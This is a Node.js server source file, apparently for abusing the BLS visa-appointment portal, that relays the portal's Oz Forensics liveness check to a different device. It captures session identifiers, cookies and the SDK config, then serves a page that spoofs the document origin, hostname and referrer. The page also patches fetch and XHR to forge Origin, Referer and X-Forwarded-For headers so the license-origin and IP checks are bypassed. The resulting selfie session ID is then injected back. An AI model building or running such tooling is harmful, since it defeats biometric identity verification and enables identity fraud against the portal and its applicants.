/**
 * 2AO Selfie Server v1.3.1
 * Deploy on Render: https://dz34sni-26.onrender.com
 * 
 * v1.3.1 CRITICAL FIX:
 *  - Replay the REAL OzLiveness.open() config captured from the BLS portal
 *    (task.ozConfig) instead of a hardcoded guess. BLS expects the exact
 *    config (action, result_mode, meta, etc.) it passed to the SDK → mismatch
 *    of guessed config = "Verification Failed".
 *  - session_token passthrough kept (if the portal ever provides one).
 * 
 * v1.3 FIXES:
 *  - Forward session_token (JWT) from agent's ozConfig to OzLiveness.open()
 * 
 * v1.2 FIXES:
 *  - Location.prototype spoof (fakes document.location.origin to BLS)
 *  - Origin/Referer headers on OZ API calls (not just X-Forwarded-For)
 *  - Consistent header injection across all OZ requests
 * 
 * Flow (uses 4-digit CODE instead of phone):
 * 1. Agent captures userId + transactionId from BLS liveness page
 * 2. Agent POSTs task to /task/:code
 * 3. Client polls GET /task/:code → receives task
 * 4. Client navigates to GET /oz-page?... → loads OZ SDK → does selfie
 * 5. Client POSTs result to /result/:code
 * 6. Agent polls GET /result/:code → gets event_session_id → injects
 * 7. Agent DELETEs /clear/:code → cleanup
 */

const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

// ═══════════════════════════════════════════
// MIDDLEWARE
// ═══════════════════════════════════════════
app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
    const ts = new Date().toISOString().substring(11, 19);
    console.log(`[${ts}] ${req.method} ${req.path}`);
    next();
});

// ═══════════════════════════════════════════
// IN-MEMORY STORAGE
// ═══════════════════════════════════════════
const tasks = {};
const results = {};

// Auto-cleanup: remove entries older than 30 minutes
setInterval(() => {
    const now = Date.now();
    const MAX_AGE = 30 * 60 * 1000;
    for (const code in tasks) {
        if (now - (tasks[code].timestamp || 0) > MAX_AGE) {
            delete tasks[code];
            console.log(`[CLEANUP] Task removed: ${code}`);
        }
    }
    for (const code in results) {
        if (now - (results[code].timestamp || 0) > MAX_AGE) {
            delete results[code];
            console.log(`[CLEANUP] Result removed: ${code}`);
        }
    }
}, 5 * 60 * 1000);

// ═══════════════════════════════════════════
// ROUTES: TASK (Agent → Client)
// ═══════════════════════════════════════════

app.post('/task/:code', (req, res) => {
    const code = req.params.code;
    const body = req.body || {};
    
    if (!body.userId || !body.transactionId) {
        return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });
    }

    tasks[code] = {
        userId: body.userId,
        transactionId: body.transactionId,
        realIp: body.realIp || '',
        proxy: body.proxy || '',
        cookies: body.cookies || '',
        userAgent: body.userAgent || '',
        pageUrl: body.pageUrl || '',
        verificationToken: body.verificationToken || '',
        ozConfig: body.ozConfig || '',
        timestamp: body.timestamp || Date.now()
    };

    console.log(`[TASK] 📥 ${code}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'} proxy=${body.proxy ? '✅' : '—'}`);
    res.json({ ok: true });
});

app.get('/task/:code', (req, res) => {
    const code = req.params.code;
    const task = tasks[code];

    if (task) {
        console.log(`[TASK] 📤 ${code}: sending task`);
        res.json({ ok: true, task: task });
    } else {
        res.json({ ok: false, task: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: RESULT (Client → Agent)
// ═══════════════════════════════════════════

app.post('/result/:code', (req, res) => {
    const code = req.params.code;
    const body = req.body || {};

    if (!body.event_session_id) {
        return res.status(400).json({ ok: false, error: 'Missing event_session_id' });
    }

    results[code] = {
        event_session_id: body.event_session_id,
        status: body.status || 'completed',
        realIp: body.realIp || '',
        timestamp: body.timestamp || Date.now()
    };

    delete tasks[code];

    console.log(`[RESULT] ✅ ${code}: session=${body.event_session_id.substring(0, 20)}...`);
    res.json({ ok: true });
});

app.get('/result/:code', (req, res) => {
    const code = req.params.code;
    const result = results[code];

    if (result) {
        console.log(`[RESULT] 📤 ${code}: sending result`);
        res.json({ ok: true, result: result });
    } else {
        res.json({ ok: false, result: null });
    }
});

// ═══════════════════════════════════════════
// ROUTES: CLEANUP
// ═══════════════════════════════════════════

app.delete('/clear/:code', (req, res) => {
    const code = req.params.code;
    delete tasks[code];
    delete results[code];
    console.log(`[CLEAR] 🗑️ ${code}`);
    res.json({ ok: true });
});

// ═══════════════════════════════════════════
// ROUTE: OZ-PAGE (Client loads this for real selfie)
// ═══════════════════════════════════════════

app.get('/oz-page', (req, res) => {
    const { userId, transactionId, realIp, code, phone, proxy } = req.query;
    const clientCode = code || phone || '';
    
    // ═══ v1.3.1: Replay the REAL ozConfig captured from the BLS portal ═══
    // The agent's 2ao-page.js captures the exact config passed to
    // OzLiveness.open() on the portal and sends it to /task/:code.
    // We replay its serializable fields (action, result_mode, meta, ...)
    // so the client page opens an IDENTICAL session, not a guessed one.
    let realCfg = {};
    let sessionToken = '';
    const task = tasks[clientCode];
    if (task && task.ozConfig) {
        try {
            const parsed = typeof task.ozConfig === 'string' ? JSON.parse(task.ozConfig) : task.ozConfig;
            if (parsed && typeof parsed === 'object') {
                for (const k of Object.keys(parsed)) {
                    if (/^on_/i.test(k)) continue;
                    if (k === '__proto__' || k === 'constructor' || k === 'prototype') continue;
                    realCfg[k] = parsed[k];
                }
            }
            sessionToken = parsed.session_token || '';
            const metaKeys = realCfg.meta ? Object.keys(realCfg.meta) : [];
            console.log(`[OZ-PAGE] ${clientCode}: real config replayed (keys: ${Object.keys(realCfg).join(',') || 'none'}) meta=${metaKeys.join(',') || '—'} session_token=${sessionToken ? '✅' : '—'}`);
        } catch (e) {
            console.log(`[OZ-PAGE] ${clientCode}: ozConfig parse error:`, e.message);
        }
    }
    realCfg.meta = Object.assign({}, realCfg.meta && typeof realCfg.meta === 'object' ? realCfg.meta : {});
    
    const escJs = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
    const uid = escJs(userId);
    const tid = escJs(transactionId);
    const ip = escJs(realIp);
    const cd = escJs(clientCode);
    const st = escJs(sessionToken);

    const html = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>BLS Liveness Check</title>
<style>
body { margin: 0; background: #08090d; font-family: system-ui, sans-serif; }
#st {
    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
    background: linear-gradient(135deg,#FF6B35,#F7931E); color: #fff;
    padding: 12px 24px; border-radius: 10px;
    font-size: 14px; z-index: 99999; text-align: center; font-weight: 700;
    box-shadow: 0 4px 20px rgba(247,147,30,.4);
}
.ozliveness_logo,.ozliveness_version{display:none!important}

/* Success overlay */
#success-screen{position:fixed;inset:0;z-index:2147483647;display:none;align-items:center;justify-content:center;background:linear-gradient(135deg,#0d9488,#059669,#047857);overflow:hidden}
@keyframes confetti{0%{opacity:1;transform:translateY(0) rotate(0deg)}100%{opacity:0;transform:translateY(100vh) rotate(720deg)}}
@keyframes pop{0%{transform:scale(0);opacity:0}50%{transform:scale(1.15)}100%{transform:scale(1);opacity:1}}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
</style>
</head>
<body>
<div id="oz-container"></div>
<div id="st">🔥 Chargement SDK...</div>

<!-- Success screen with confetti -->
<div id="success-screen">
    <div id="confetti-container"></div>
    <div style="text-align:center;z-index:2;animation:pop .6s ease-out forwards">
        <div style="font-size:80px;margin-bottom:10px;animation:bounce 1.5s ease-in-out infinite">🎉</div>
        <div style="font-size:36px;font-weight:900;color:#fff;margin-bottom:8px;text-shadow:0 4px 20px rgba(0,0,0,.3)">FÉLICITATIONS !</div>
        <div style="font-size:20px;font-weight:700;color:rgba(255,255,255,.9);margin-bottom:6px">✅ Selfie réussi avec succès</div>
        <div style="font-size:15px;color:rgba(255,255,255,.7);margin-bottom:28px">يمكنك الان اغلاق هذه الصفحة</div>
        <button onclick="window.location.href='https://algeria.blsspainglobal.com/assets/images/favicon.png?'" style="padding:16px 44px;border-radius:14px;border:none;cursor:pointer;font-weight:700;font-size:17px;color:#059669;background:#fff;box-shadow:0 6px 30px rgba(0,0,0,.2);letter-spacing:1px;animation:pop .6s ease-out .3s both">🏠 RETOUR</button>
        <div style="margin-top:16px;font-size:14px;color:rgba(255,255,255,.7);font-weight:700">Retour dans <span id="countdown">8</span>s</div>
    </div>
</div>

<!-- ═══ LOCATION ORIGIN SPOOF ═══ -->
<!-- The OZ SDK checks document.location.origin against its license.
     This page lives on onrender.com → LICENSE_ORIGIN_ERROR.
     We patch Location.prototype BEFORE any SDK script runs so
     the SDK sees algeria.blsinternational.com as the origin. -->
<script>
(function(){
    var B='https://algeria.blsinternational.com';
    var H='algeria.blsinternational.com';
    try{Object.defineProperty(window,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
    try{Object.defineProperty(location,'origin',{configurable:true,get:function(){return B;}});}catch(e){}
    try{Object.defineProperty(document,'domain',{configurable:true,get:function(){return H;}});}catch(e){}
    try{Object.defineProperty(document,'referrer',{configurable:true,get:function(){return B+'/manage-appointments';}});}catch(e){}
    var P=window.Location&&window.Location.prototype;
    if(P){
        [['origin',function(){return B;}],
        ['hostname',function(){return H;}],
        ['host',function(){return H;}],
        ['protocol',function(){return 'https:';}]
        ].forEach(function(a){try{Object.defineProperty(P,a[0],{configurable:true,get:a[1]});}catch(e){}});
    }
    try{history.replaceState({},'', '/dza/appointment/LivenessRequest');}catch(e){}
})();
</script>

<!-- ═══ OZ API HEADER INJECTION ═══ -->
<!-- Intercept fetch/XHR to add Origin, Referer, X-Forwarded-For on OZ API calls.
     Without Origin/Referer → LICENSE_ORIGIN_ERROR.
     Without X-Forwarded-For → IP mismatch detected by OZ. -->
<script>
(function(){
    var REAL_IP = '${ip}';
    var BLS_ORIGIN = 'https://algeria.blsinternational.com';
    var BLS_REFERER = 'https://algeria.blsinternational.com/manage-appointments';
    
    function isOzApi(u){ 
        return typeof u==='string' && u.indexOf('ozforensics.com')!==-1 && u.indexOf('web-sdk.prod.cdn.spain.ozforensics.com')===-1; 
    }
    
    // Patch fetch
    var _f = window.fetch;
    window.fetch = function(u, o) {
        o = o || {};
        if (isOzApi(u)) {
            if (!o.headers) o.headers = {};
            if (o.headers instanceof Headers) {
                o.headers.set('X-Forwarded-For', REAL_IP);
                o.headers.set('X-Real-IP', REAL_IP);
                o.headers.set('Origin', BLS_ORIGIN);
                o.headers.set('Referer', BLS_REFERER);
            } else {
                o.headers['X-Forwarded-For'] = REAL_IP;
                o.headers['X-Real-IP'] = REAL_IP;
                o.headers['Origin'] = BLS_ORIGIN;
                o.headers['Referer'] = BLS_REFERER;
            }
        }
        return _f.call(this, u, o);
    };
    
    // Patch XMLHttpRequest
    var _xo = XMLHttpRequest.prototype.open;
    var _xs = XMLHttpRequest.prototype.send;
    var _xh = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.open = function(m, u) { this._dzUrl = u; return _xo.apply(this, arguments); };
    XMLHttpRequest.prototype.send = function() {
        if (isOzApi(this._dzUrl)) {
            try { _xh.call(this, 'X-Forwarded-For', REAL_IP); } catch(e) {}
            try { _xh.call(this, 'X-Real-IP', REAL_IP); } catch(e) {}
            try { _xh.call(this, 'Origin', BLS_ORIGIN); } catch(e) {}
            try { _xh.call(this, 'Referer', BLS_REFERER); } catch(e) {}
        }
        return _xs.apply(this, arguments);
    };
})();
</script>

<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
    <input type="hidden" name="event_session_id" id="event_session_id" value="">
    <input type="hidden" name="LivenessId" id="LivenessId" value="">
    <input type="hidden" name="__RequestVerificationToken" value="">
</form>

<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational3/plugin_liveness.php?ver=1.9.7-29"></script>

<script>
function showSuccess() {
    var screen = document.getElementById('success-screen');
    if (!screen) return;
    screen.style.display = 'flex';
    
    // Generate confetti
    var container = document.getElementById('confetti-container');
    var colors = ['#FFD700','#FF6B35','#F7931E','#4ade80','#60a5fa','#c084fc','#fb7185','#fff'];
    for (var i = 0; i < 60; i++) {
        var d = document.createElement('div');
        d.style.cssText = 'position:absolute;top:-10px;left:' + Math.random()*100 + '%;width:' + (4+Math.random()*8) + 'px;height:' + (4+Math.random()*8) + 'px;background:' + colors[Math.floor(Math.random()*8)] + ';border-radius:' + (Math.random()>.5?'50%':'2px') + ';animation:confetti ' + (2+Math.random()*3) + 's ease-out ' + Math.random()*2 + 's forwards;opacity:0';
        container.appendChild(d);
    }
    
    // Countdown
    var countEl = document.getElementById('countdown');
    var sec = 8;
    var t = setInterval(function() {
        sec--;
        if (countEl) countEl.textContent = String(sec);
        if (sec <= 0) {
            clearInterval(t);
            window.location.href = 'https://algeria.blsspainglobal.com/assets/images/favicon.png?';
        }
    }, 1000);
}

window.addEventListener('load', function() {
    document.getElementById('st').textContent = '🔥 Lancement...';
    setTimeout(function() {
        try {
            if (typeof OzLiveness === 'undefined') {
                document.getElementById('st').textContent = 'SDK non chargé';
                if (window.Android) window.Android.onSelfieError('SDK not loaded');
                return;
            }
            document.getElementById('st').textContent = '📸 Démarrage selfie...';
            var _st = '${st}';
            // v1.3.1: exact config rejoué du portail BLS (action, result_mode, meta...)
            var _ozCfg = ${JSON.stringify(realCfg).replace(/</g, '\\u003c')};
            _ozCfg.meta = _ozCfg.meta || {};
            if ('${uid}') _ozCfg.meta.user_id = '${uid}';
            if ('${tid}') _ozCfg.meta.transaction_id = '${tid}';
            if (_st) _ozCfg.session_token = _st;
            // filet de secours si le config rejoué est vide
            if (!_ozCfg.action) _ozCfg.action = ['video_selfie_blank'];
            if (!_ozCfg.result_mode) _ozCfg.result_mode = 'safe';
            if (!_ozCfg.lang) _ozCfg.lang = 'en';
            if (typeof _ozCfg.overlay_options === 'undefined') _ozCfg.overlay_options = false;
            _ozCfg.on_complete = function(r) {
                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
                    if (sid) {
                        document.getElementById('st').textContent = '✅ Selfie OK!';
                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
                        try { document.getElementById('LivenessId').value = sid; } catch(e) {}
                        if (window.Android) try { window.Android.onSelfieComplete(sid); } catch(ab) {}
                        // AUTO POST result to server (for APK Chrome Custom Tabs support)
                        var _code = '${cd}';
                        if (_code) {
                            fetch('/result/' + encodeURIComponent(_code), {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ event_session_id: sid, status: 'completed', realIp: '${ip}', timestamp: Date.now() })
                            }).catch(function(){});
                        }
                        showSuccess();
                    } else {
                        document.getElementById('st').textContent = 'Pas de session ID';
                        if (window.Android) window.Android.onSelfieError('No session ID');
                    }
                };
                _ozCfg.on_error = function(e) {
                    var msg = e && e.message ? e.message : String(e);
                    document.getElementById('st').textContent = 'Erreur: ' + msg;
                    if (window.Android) window.Android.onSelfieError(msg);
                };
                OzLiveness.open(_ozCfg);
        } catch(x) {
            document.getElementById('st').textContent = 'Erreur: ' + x.message;
            if (window.Android) window.Android.onSelfieError(x.message);
        }
    }, 3000);
});
</script>
</body>
</html>`;

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(html);
});

// ═══════════════════════════════════════════
// HEALTH & STATUS
// ═══════════════════════════════════════════

app.get('/', (req, res) => {
    res.json({
        service: '2AO Selfie',
        version: '1.3.1',
        status: 'running',
        activeTasks: Object.keys(tasks).length,
        activeResults: Object.keys(results).length,
        uptime: Math.floor(process.uptime()) + 's'
    });
});

app.get('/health', (req, res) => {
    res.json({ ok: true, timestamp: Date.now() });
});

app.get('/debug', (req, res) => {
    res.json({
        tasks: Object.keys(tasks).map(c => ({ code: c, userId: (tasks[c].userId || '').substring(0, 10) + '...', age: Math.floor((Date.now() - tasks[c].timestamp) / 1000) + 's' })),
        results: Object.keys(results).map(c => ({ code: c, sessionId: (results[c].event_session_id || '').substring(0, 10) + '...', age: Math.floor((Date.now() - results[c].timestamp) / 1000) + 's' }))
    });
});

// ═══════════════════════════════════════════
// START
// ═══════════════════════════════════════════
app.listen(PORT, () => {
    console.log(`\n🔥 2AO Selfie Server v1.3.1`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Ready!\n`);
});
